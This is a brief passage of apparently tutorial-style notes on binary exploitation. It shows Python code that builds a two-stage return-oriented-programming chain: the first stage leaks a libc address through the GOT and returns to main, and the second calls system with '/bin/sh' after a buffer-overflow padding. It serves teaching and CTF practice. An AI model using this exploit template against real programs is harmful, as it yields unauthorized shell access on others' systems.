# The chain script — assembling in code


Build the chain in a script — every address a variable, every stage
a block:

    p = lambda x: struct.pack('<Q', x)
    def chain(*items): return b''.join(p(i) for i in items)

    stage1 = b'A'*offset + chain(pop_rdi, got, plt, main)
    stage2 = b'A'*offset + chain(pop_rdi, binsh, ret, system)

## The audit

The script IS the chain's documentation — each named address is
traceable to a scan output line.
